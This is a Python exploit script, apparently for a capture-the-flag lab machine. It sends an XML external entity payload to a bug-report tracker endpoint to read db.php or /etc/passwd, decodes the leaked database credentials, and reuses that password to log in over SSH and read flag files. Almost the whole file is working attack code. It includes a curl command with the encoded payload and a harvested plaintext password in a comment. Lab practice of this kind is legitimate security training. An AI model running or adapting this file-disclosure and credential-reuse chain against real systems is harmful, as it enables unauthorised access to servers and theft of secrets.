#!/usr/bin/python3

import requests
import urllib.parse
import base64
from pexpect import pxssh

#-------------------------------------XXE--------------------------------------
# https://portswigger.net/web-security/xxe

IP = '10.10.11.100'

#development:x:1000:1000:Development:/home/development:/bin/bash
payload = 'php://filter/convert.base64-encode/resource=db.php'#'file:///etc/passwd'

data = '<?xml  version="1.0" encoding="ISO-8859-1"?>\
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + payload + '"> ]>\
		<bugreport>\
		<title>&xxe;</title>\
		<cwe>cwe</cwe>\
		<cvss>score</cvss>\
		<reward>reward</reward>\
		</bugreport>'

data64 = str(base64.b64encode(data.encode('utf-8')), 'utf-8')

send_data = {
    'data' : data64
}

# curl -X POST http://10.10.11.100/tracker_diRbPr00f314.php -d data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz48IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4JCTxidWdyZXBvcnQ%2BCQk8dGl0bGU%2BJnh4ZTs8L3RpdGxlPgkJPGN3ZT5jd2U8L2N3ZT4JCTxjdnNzPnNjb3JlPC9jdnNzPgkJPHJld2FyZD5yZXdhcmRzPC9yZXdhcmQ%2BCQk8L2J1Z3JlcG9ydD4%3D -v

r = requests.post('http://' + IP + '/tracker_diRbPr00f314.php', data=send_data)

xxe = r.text[r.text.find('<td>Title:</td>\n    <td>') + len('<td>Title:</td>\n    <td>'):]
xxe = xxe[:xxe.find('</td>')]

print("REQUEST:", r.url)
print("BODY   :", r.request.body, "\n")
print('XXE    :\n' + xxe, "\n")

#------------------------------------------------------------------------------

print(str(base64.b64decode(xxe), 'utf-8'))

'''
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
'''

hostname = IP
username = 'development'

try:
    s1 = pxssh.pxssh()
    s1.login(hostname, username, 'm19RoAU0hP41A1sTsq6K')
    s1.sendline('cat contract.txt')
    s1.prompt()
    [print(_) for _ in ''.join(map(chr, s1.before)).replace('\r', '').split('\n')]
    s1.sendline('cat user.txt')
    s1.prompt()
    [print(_) for _ in ''.join(map(chr, s1.before)).replace('\r', '').split('\n')]
    s1.logout()    
except pxssh.ExceptionPxssh as e:
    print("pxssh failed on login.")
    print(e)

